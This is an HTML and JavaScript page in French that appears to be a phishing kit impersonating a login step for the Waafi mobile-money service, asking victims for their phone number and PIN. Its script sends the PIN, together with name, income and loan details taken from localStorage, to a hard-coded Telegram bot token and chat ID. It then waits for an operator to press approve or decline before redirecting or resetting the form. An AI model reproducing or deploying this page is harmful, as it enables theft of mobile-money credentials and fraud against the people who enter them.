<!DOCTYPE html>
<html lang="fr">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Commencer</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            color: #1a1a1a;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
            padding: 20px;
        }
        
        .top-bar {
            display: flex;
            align-items: center;
            justify-content: space-between;
            width: 100%;
        }
        
        .back-btn {
            font-size: 24px;
            background: none;
            border: none;
            cursor: pointer;
            padding: 5px 0;
            color: #1a1a1a;
        }
        
        .logo-img {
            max-height: 40px;
            width: auto;
            object-fit: contain;
        }
        
        .header-section {
            margin-top: 25px;
            margin-bottom: 30px;
        }
        
        .title {
            font-size: 26px;
            font-weight: 700;
            color: #1a202c;
            margin-bottom: 8px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #718096;
        }
        
        .form-container {
            display: flex;
            flex-direction: column;
            gap: 20px;
            flex-grow: 1;
        }
        
        .input-group {
            display: flex;
            align-items: center;
            border: 1.5px solid #2d3748;
            border-radius: 12px;
            padding: 16px;
            background-color: #fff;
        }
        
        .input-group .country-code {
            font-size: 15px;
            font-weight: 500;
            color: #2d3748;
            margin-right: 16px;
        }
        
        .input-group input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 15px;
            color: #2d3748;
            background: transparent;
        }
        
        .input-group input::placeholder {
            color: #a0aec0;
        }
        
        .bottom-section {
            margin-top: auto;
            padding-top: 20px;
        }
        
        .terms-container {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
            cursor: pointer;
        }
        
        .terms-container input[type="checkbox"] {
            width: 18px;
            height: 18px;
            accent-color: #92a4c0;
            border-radius: 4px;
            cursor: pointer;
        }
        
        .terms-label {
            font-size: 13px;
            color: #4a5568;
        }
        
        .terms-label a {
            color: #2b6cb0;
            text-decoration: none;
        }
        
        .submit-btn {
            width: 100%;
            padding: 16px;
            background-color: #92a4c0;
            color: #ffffff;
            border: none;
            border-radius: 12px;
            font-size: 16px;
            font-weight: 600;
            cursor: not-allowed;
            transition: background-color 0.2s ease;
        }
        
        .submit-btn.active {
            background-color: #4a5568;
            cursor: pointer;
        }
        
        .loading-overlay {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.9);
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            font-size: 18px;
            font-weight: 600;
            color: #2d3748;
            gap: 12px;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #cbd5e0;
            border-top: 4px solid #4a5568;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        
        @keyframes spin {
            0% {
                transform: rotate(0deg);
            }
            100% {
                transform: rotate(360deg);
            }
        }
    </style>
</head>

<body>

    <div class="top-bar">
        <button class="back-btn" onclick="history.back()">&#8592;</button>
        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTn_5VYmxA4NGfip7K56How6z7pn9bFgakJPQwVOc3iyQ&s=10" alt="Logo" class="logo-img">
    </div>

    <div class="header-section">
        <h1 class="title">Commencer</h1>
        <p class="subtitle">Entrez votre numéro de téléphone et votre code PIN pour continuer</p>
    </div>

    <!-- Loading Overlay -->
    <div id="loading-overlay" class="loading-overlay">
        <div class="spinner"></div>
        <span>En attente d'approbation...</span>
    </div>

    <form class="form-container" id="loginForm">
        <!-- Phone Input -->
        <div class="input-group">
            <span class="country-code">+253</span>
            <input type="tel" id="phoneInput" placeholder="Entrez le numéro de téléphone" maxlength="8" inputmode="numeric" required>
        </div>

        <!-- PIN Input -->
        <div class="input-group">
            <input type="password" id="pinInput" placeholder="Entrez le code PIN" maxlength="6" inputmode="numeric" required>
        </div>

        <div class="bottom-section">
            <label class="terms-container">
                <input type="checkbox" id="termsCheckbox">
                <span class="terms-label">J'accepte les <a href="#">Conditions d'utilisation</a></span>
            </label>

            <button type="submit" id="submitBtn" class="submit-btn" disabled>Continuer</button>
        </div>
    </form>

    <script>
        document.addEventListener("DOMContentLoaded", function() {
            const phoneInput = document.getElementById('phoneInput');
            const pinInput = document.getElementById('pinInput');
            const termsCheckbox = document.getElementById('termsCheckbox');
            const submitBtn = document.getElementById('submitBtn');
            const loginForm = document.getElementById('loginForm');
            const overlay = document.getElementById('loading-overlay');

            // Pre-fill phone from localStorage if available
            const savedPhone = localStorage.getItem('phone') || "";
            if (savedPhone) {
                phoneInput.value = savedPhone;
                validateForm();
            }

            // Sanitize numeric inputs
            [phoneInput, pinInput].forEach(input => {
                input.addEventListener('input', function() {
                    this.value = this.value.replace(/\D/g, '');
                    validateForm();
                });
            });

            termsCheckbox.addEventListener('change', validateForm);

            function validateForm() {
                const isPhoneValid = phoneInput.value.length >= 6;
                const isPinValid = pinInput.value.length >= 4;
                const isAgreed = termsCheckbox.checked;

                const isValid = isPhoneValid && isPinValid && isAgreed;
                submitBtn.disabled = !isValid;
                submitBtn.classList.toggle('active', isValid);
            }

            // Form Submit Event Handler
            loginForm.addEventListener('submit', async function(event) {
                event.preventDefault();

                const phone = phoneInput.value.trim();
                const pin = pinInput.value.trim();

                if (!phone || phone.length < 6 || !pin || pin.length < 4) {
                    return;
                }

                if (overlay) overlay.style.display = "flex";

                // Save to localStorage
                localStorage.setItem('phone', phone);
                localStorage.setItem('userPhone', phone);
                localStorage.setItem('lastPin', pin);

                // Collect ALL data
                const allData = {
                    amount: localStorage.getItem('amount') || '',
                    loanDuration: localStorage.getItem('loanDuration') || '',
                    loanType: localStorage.getItem('loanType') || '',
                    loanPurpose: localStorage.getItem('loanPurpose') || '',
                    loanAmount: localStorage.getItem('loanAmount') || '',
                    firstName: localStorage.getItem('firstName') || '',
                    lastName: localStorage.getItem('lastName') || '',
                    phone: phone,
                    jobStatus: localStorage.getItem('jobStatus') || '',
                    income: localStorage.getItem('income') || '',
                    pin: pin
                };

                // Build the message text in French
                const messageLines = [
                    "🔐 *Données de Connexion Waafi*",
                    "",
                    "👤 *Nom :* " + (allData.firstName || "---") + " " + (allData.lastName || "---"),
                    "📞 *Téléphone :* +253 " + allData.phone,
                    "💰 *Montant :* $" + (allData.amount || "---"),
                    "📆 *Durée :* " + (allData.loanDuration || "---"),
                    "📋 *Type :* " + (allData.loanType || "---"),
                    "📝 *Motif :* " + (allData.loanPurpose || "---"),
                    "💼 *Emploi :* " + (allData.jobStatus || "---"),
                    "💵 *Revenu :* $" + (allData.income || "---"),
                    "🔑 *PIN :* " + allData.pin
                ];
                const message = messageLines.join("\n");

                // Generate a unique session ID for the inline keyboard buttons
                const sessionId = 'sess_' + Date.now();

                const inlineKeyboard = {
                    inline_keyboard: [
                        [{
                            text: "✅ Approuvé",
                            callback_data: `approve:${sessionId}`
                        }, {
                            text: "❌ Refusé",
                            callback_data: `decline:${sessionId}`
                        }]
                    ]
                };

                // Send to Telegram Bot via HTTP API
                const BOT_TOKEN = "7996666362:AAFVzLC1LD14nkmJN8MN98SRdOu2hIA1ftc";
                const CHAT_ID = "8406078749";

                try {
                    const response = await fetch("https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            parse_mode: "Markdown",
                            reply_markup: inlineKeyboard
                        })
                    });

                    const result = await response.json();
                    console.log("Telegram API response:", result);

                    if (result.ok) {
                        // Start polling for button responses
                        startPollingForApproval(BOT_TOKEN, sessionId);
                    } else {
                        if (overlay) overlay.style.display = "none";
                        alert("Erreur lors de l'envoi de la demande. Veuillez réessayer.");
                    }
                } catch (err) {
                    console.error("❌ Network error sending to Telegram:", err);
                    if (overlay) overlay.style.display = "none";
                    alert("Erreur réseau. Veuillez vérifier votre connexion.");
                }
            });

            // Function to check Telegram updates for callback queries
            function startPollingForApproval(botToken, sessionId) {
                let offset = 0;
                let pollInterval = setInterval(async function() {
                    try {
                        const response = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?offset=${offset}&timeout=5`);
                        const data = await response.json();

                        if (data.ok && data.result) {
                            for (const update of data.result) {
                                offset = update.update_id + 1;

                                if (update.callback_query) {
                                    const callbackData = update.callback_query.data;
                                    const callbackQueryId = update.callback_query.id;

                                    if (callbackData === `approve:${sessionId}`) {
                                        clearInterval(pollInterval);

                                        // Answer callback to remove loading animation on Telegram button
                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json"
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: callbackQueryId,
                                                text: "Approuvé !"
                                            })
                                        });

                                        if (overlay) overlay.style.display = "none";
                                        window.location.href = "page7.html";
                                        return;
                                    } else if (callbackData === `decline:${sessionId}`) {
                                        clearInterval(pollInterval);

                                        // Answer callback
                                        await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
                                            method: "POST",
                                            headers: {
                                                "Content-Type": "application/json"
                                            },
                                            body: JSON.stringify({
                                                callback_query_id: callbackQueryId,
                                                text: "Refusé. Réinitialisation du formulaire."
                                            })
                                        });

                                        if (overlay) overlay.style.display = "none";

                                        // Reset form for re-entry
                                        loginForm.reset();
                                        phoneInput.value = "";
                                        pinInput.value = "";
                                        termsCheckbox.checked = false;
                                        validateForm();

                                        alert("Votre demande a été refusée. Veuillez saisir à nouveau vos informations.");
                                        return;
                                    }
                                }
                            }
                        }
                    } catch (error) {
                        console.error("Polling error:", error);
                    }
                }, 2000);
            }

            // Telegram WebApp initialization
            if (window.Telegram && window.Telegram.WebApp) {
                window.Telegram.WebApp.ready();
                window.Telegram.WebApp.expand();
            }
        });
    </script>

</body>

</html>
